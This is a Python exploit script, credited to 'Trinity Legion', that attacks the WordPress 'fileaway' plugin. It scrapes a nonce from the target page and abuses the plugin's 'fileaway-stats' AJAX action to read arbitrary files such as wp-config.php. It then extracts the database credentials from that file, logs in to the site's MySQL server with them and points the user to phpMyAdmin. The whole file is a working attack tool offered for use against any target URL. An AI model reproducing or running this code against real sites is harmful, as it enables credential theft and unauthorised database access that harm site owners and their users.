#!/usr/bin/env python3
# Create by : Trinity Legion

import requests
import re
import os
import urllib3
from datetime import datetime
from rich.console import Console

# untuk koneksi MySQL
try:
    import mysql.connector
    from mysql.connector import Error
except ImportError:
    print("❌ mysql-connector-python belum terpasang. Jalankan: pip install mysql-connector-python")
    exit(1)

# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

console = Console()

def banner():
    os.system("cls" if os.name == "nt" else "clear")
    banner_text = r"""

███████╗██╗██╗     ███████╗ █████╗ ██╗    ██╗ █████╗ ██╗   ██╗
██╔════╝██║██║     ██╔════╝██╔══██╗██║    ██║██╔══██╗╚██╗ ██╔╝
█████╗  ██║██║     █████╗  ███████║██║ █╗ ██║███████║ ╚████╔╝ 
██╔══╝  ██║██║     ██╔══╝  ██╔══██║██║███╗██║██╔══██║  ╚██╔╝  
██║     ██║███████╗███████╗██║  ██║╚███╔███╔╝██║  ██║   ██║   
╚═╝     ╚═╝╚══════╝╚══════╝╚═╝  ╚═╝ ╚══╝╚══╝ ╚═╝  ╚═╝   ╚═╝  

#fileaway plugin
#develope by : Trinity Legion
"""
    console.print(banner_text, style="yellow")

def get_nonce(target):
    console.print(f"\n🔍 Fetching nonce from: [cyan]{target}[/]")
    try:
        resp = requests.get(target, verify=False, timeout=10)
        match = re.search(
            r'var fileaway_stats\s*=\s*{[^}]*"nonce":"([0-9a-f]+)"',
            resp.text
        )
        if match:
            return match.group(1)
        console.print("⚠️  Nonce not found in page.")
    except Exception as e:
        console.print(f"❌ Failed to fetch nonce: {e}")
    return None

def exploit(target, nonce, filename):
    ajax = f"{target.rstrip('/')}/wp-admin/admin-ajax.php"
    payload = {"action":"fileaway-stats","nonce":nonce,"file":filename}
    console.print(f"🚀 Exploiting with file: [magenta]{filename}[/]")
    try:
        r = requests.post(ajax, data=payload, verify=False, timeout=10)
        if r.status_code == 200 and r.text.strip() and 'error' not in r.text.lower():
            url = r.text.strip().replace("\\/","/").strip('"')
            return url
    except Exception as e:
        console.print(f"❌ Exploit error: {e}")
    return None

def parse_wp_config(text):
    """Parse DB creds dari wp-config.php"""
    creds = {}
    for line in text.splitlines():
        m = re.match(r"define\(\s*'DB_([A-Z_]+)'\s*,\s*'(.+?)'\s*\)", line)
        if m:
            k, v = m.groups()
            creds[k] = v
    return creds

def connect_db(creds):
    """Coba koneksi MySQL, return True jika sukses"""
    # Pisahkan host dan port jika perlu
    host_port = creds.get('HOST', 'localhost')
    if ':' in host_port:
        host, port_s = host_port.split(':', 1)
        try:
            port = int(port_s)
        except ValueError:
            port = 3306
    else:
        host = host_port
        port = 3306

    db   = creds.get('NAME')
    user = creds.get('USER')
    pw   = creds.get('PASSWORD')

    console.print(f"🔌 Connecting to DB [green]{db}[/]@[cyan]{host}[/]:[cyan]{port}[/] with user [magenta]{user}[/]")
    try:
        conn = mysql.connector.connect(
            host=host,
            port=port,
            database=db,
            user=user,
            password=pw
        )
        if conn.is_connected():
            conn.close()
            return True
    except Error as e:
        console.print(f"❌ DB connection failed: {e}")
    return False

def main():
    banner()
    target   = console.input("\n🌐 Enter target URL (e.g. https://site.com): ").strip()
    filename = console.input("📄 Enter filename to read (e.g. wp-config.php): ").strip()

    t0 = datetime.now()
    console.print(f"\n⏱  Started at {t0.strftime('%H:%M:%S')}")

    nonce = get_nonce(target)
    if not nonce:
        console.print("\n🚫 Exiting, nonce missing.")
        return

    console.print(f"✅ Nonce obtained: [green]{nonce}[/]")

    url = exploit(target, nonce, filename)
    if not url:
        console.print("\n❌ Exploit failed to retrieve file URL.")
        return

    console.print(f"\n🎉 File URL: [blue]{url}[/]")

    # Ambil wp-config.php
    try:
        cfg = requests.get(url, verify=False, timeout=10).text
    except Exception as e:
        console.print(f"❌ Failed to fetch wp-config.php: {e}")
        return

    # Parse dan test DB
    creds = parse_wp_config(cfg)
    if not creds.get('NAME') or not creds.get('USER'):
        console.print("⚠️  Gagal parse database credentials.")
        return

    if connect_db(creds):
        pmu = target.rstrip('/') + "/phpmyadmin"
        console.print(f"\n🔑 phpMyAdmin URL: [underline]{pmu}[/]")
    else:
        console.print("\n❌ Tidak dapat login ke database dengan kredensial di atas.")

    t1 = datetime.now()
    dur = (t1 - t0).total_seconds()
    console.print(f"\n⏱  Finished at {t1.strftime('%H:%M:%S')} (Duration: {dur:.2f}s)")

if __name__ == "__main__":
    main()
